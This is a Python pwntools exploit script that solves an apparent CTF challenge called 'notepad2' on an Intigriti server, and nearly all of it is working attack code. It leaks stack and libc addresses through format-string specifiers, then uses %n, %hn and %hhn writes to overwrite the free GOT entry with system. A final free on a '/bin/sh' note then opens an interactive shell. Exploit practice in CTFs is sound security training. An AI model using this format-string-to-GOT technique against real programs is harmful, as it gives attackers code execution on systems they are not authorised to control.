import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'
libc = ELF('./libc.so.6')

### ------------------ EXPLOIT ------------------ ###

context.arch = 'amd64'

# r = Pwn(PROG)
r = Pwn(PROG, conn='notepad2.ctf.intigriti.io 1342')

def create(index, data):
    r.sla(b'> ', b'1')
    r.sla(b'> ', str(index).encode())
    r.sa(b'> ', data)
    r.sl(b'')

def view(index):
    r.sla(b'> ', b'2')
    r.sla(b'> ', str(index).encode())

def remove(index):
    r.sla(b'> ', b'3')
    r.sla(b'> ', str(index).encode())


# Call free to resolve GOT address
create(9, b'hello')
remove(9)

# Needed for later
create(9, b'/bin/sh\x00')

# Leak libc pointer on the stack
pay = '|'.join([f"0x%{i}$lx|" for i in [8, 13]])
create(0, pay)
r.gdb(hex(r.sym['viewNote']))
view(0)

r.ru(b'0x')
rbp_leak = int(r.ru(b'||0x')[:-4].decode(), 16)
libc_leak = int(r.ru(b'|')[:-1].decode(), 16)
log.info('Saved rbp leak: ' + hex(rbp_leak))

libc.address = libc_leak - 0x28150
log.info('Leaked libc base: ' + hex(libc.address))
log.info('system: ' + hex(libc.symbols['system']))
log.info('free: ' + hex(libc.symbols['free']))

# Saved RBP is on the stack, use this to
# write address to free@got onto the stack
# free@got [0x404000]
pay = b'%4210688c%8$n'
create(1, pay)
view(1)

# Now that free@got [0x404000] is on the stack, we can
# use that to write over free -> system
# Start with the lower 2 bytes
_r = int(hex(libc.symbols['system'])[-4:], 16)
pay = f'%{_r}c%12$hn'
create(2, pay)
view(2)

# Get 0x404002 onto stack so that we can write the 3rd byte
pay = b'%2c%8$hhn'
create(3, pay)
view(3)

# free -> system
_r = int(hex(libc.symbols['system'])[-6:-4], 16)
pay = f'%{_r}c%12$hhn'
create(4, pay)
view(4)

# Call free which will trigger system
remove(9)

r.interactive()